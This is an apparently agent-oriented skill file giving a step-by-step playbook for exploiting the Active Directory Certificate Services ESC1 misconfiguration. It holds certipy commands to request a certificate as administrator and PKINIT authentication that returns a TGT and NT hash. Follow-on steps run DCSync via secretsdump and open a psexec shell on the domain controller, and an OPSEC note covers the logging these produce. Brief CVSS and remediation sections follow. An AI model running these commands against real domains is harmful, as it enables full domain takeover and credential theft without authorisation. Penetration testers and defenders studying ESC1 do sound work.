---
name: adcs-esc1
description: Exploit Active Directory Certificate Services ESC1 — vulnerable template allows arbitrary SAN, enabling user impersonation up to domain admin.
metadata:
  subdomain: active-directory
  when_to_use: "adcs esc1 ad certificate services template misconfiguration domain admin"
  mitre_attack:
    - T1649
    - T1078.002
---

# ADCS ESC1 Exploitation

ESC1 is the most common ADCS misconfig: a certificate template with
**ENROLLEE_SUPPLIES_SUBJECT** set, allowing any enrollee to request a
cert for any user. Pair with **Client Authentication** EKU → authenticate
as that user via PKINIT → instant domain admin.

## 1. Enumerate templates
```bash
# Certipy (preferred)
certipy find -u USER@DOM -p 'PASS' -dc-ip DC_IP \
  -output /tmp/adcs -text -stdout > /tmp/adcs.txt

# Or check JSON
certipy find -u USER@DOM -p 'PASS' -dc-ip DC_IP -json \
  -output /tmp/adcs.json
```

Decepticon ingest:
```
adcs_audit("/tmp/adcs.json")
```

## 2. Identify ESC1 candidates
A template is ESC1-vulnerable when ALL true:
- `Enrollment Rights` includes a group the attacker is in (Domain Users / Authenticated Users is jackpot)
- `Client Authentication EKU` or `Smart Card Logon EKU` or `Any Purpose`
- `Enrollee Supplies Subject` flag set (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
- `Manager Approval` disabled
- `Authorized Signatures Required` is 0

certipy output marks these clearly:
```
[!] Vulnerabilities
        ESC1                                : 'DOMAIN\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

## 3. Request the cert as Domain Admin
```bash
certipy req -u USER@DOM -p 'PASS' -ca CA_NAME \
  -target CA_FQDN -template VULNERABLE_TEMPLATE \
  -upn 'administrator@dom' \
  -dc-ip DC_IP \
  -out /tmp/admin.pfx
```

The magic is `-upn administrator@dom` — because ENROLLEE_SUPPLIES_SUBJECT
is set, the CA issues a cert with that UPN even though we're a regular
user requesting it.

## 4. Authenticate as Domain Admin
**PKINIT** (cert → TGT):
```bash
certipy auth -pfx /tmp/admin.pfx -dc-ip DC_IP
# Output: TGT cached, NT hash printed
```

You get back:
- A TGT in `administrator.ccache` (use w/ `export KRB5CCNAME=...`)
- The NT hash of administrator (because PKINIT replies include the user's NT hash for legacy compat)

## 5. Operate as Domain Admin
With NT hash:
```bash
# DCSync
secretsdump.py -hashes :NT_HASH 'DOM/administrator@DC_IP' -just-dc

# Shell on DC
psexec.py -hashes :NT_HASH 'DOM/administrator@DC_IP'

# Or use the ccache TGT directly
export KRB5CCNAME=/tmp/administrator.ccache
smbclient.py -k -no-pass 'DC@DC_IP'
```

## 6. Promote
```
kg_add_node(kind="vulnerability", label="ADCS ESC1: <template> → DA",
            props={"severity":"critical","ca":"<ca>","template":"<tpl>"})
kg_add_node(kind="credential", label="administrator:NT_HASH")
kg_add_edge(src=<vuln>, dst=<cred>, kind="grants")
kg_add_edge(src=<cred>, dst=<crown_jewel:domain>, kind="compromises")
```

## ESC variants quick-ref

| ESC | Misconfig | Sub-skill |
|---|---|---|
| ESC1 | Enrollee supplies subject + client auth EKU | THIS doc |
| ESC2 | Any Purpose EKU template | similar to ESC1 |
| ESC3 | Enrollment Agent template | needs ESC3 + ESC2 combo |
| ESC4 | Vulnerable template ACL (GenericAll, WriteDacl) | edit template → ESC1 |
| ESC5 | Vulnerable PKI object ACL | edit CA settings |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | request as any user via SAN |
| ESC7 | Vulnerable CA ACL (ManageCA, ManageCertificates) | approve denied req |
| ESC8 | NTLM relay → AD CS web enrollment | coerce + relay |
| ESC9 | UPN no security extension | low-priv → high-priv via S4U2self |
| ESC10 | Weak certificate mapping (StrongCertificateBindingEnforcement=0) | UPN spoof |
| ESC11 | NTLM relay to ICPR (RPC) | similar to ESC8 |
| ESC13 | Cert template w/ OID linked to group → group membership manipulation | |

## OPSEC
- Certipy req generates **event 4886** on the CA (cert issued)
- PKINIT generates **event 4768** on DC w/ certificate fields populated
- Hard to suppress; rely on engagement being permitted to be loud here

## CVSS
- Any ESC1 reachable from low-priv user: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 9.0
- ESC1 reachable from anonymous (rare): 10.0
- ESC8 NTLM relay (different exploit, same outcome): 9.8

## Defender remediation
```powershell
# Disable the dangerous flag
certutil -dstemplate <Template> | findstr msPKI-Certificate-Name-Flag
# Should NOT contain CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1)

# Fix via UI: Template properties → Subject Name tab → uncheck
# "Supply in the request"
```
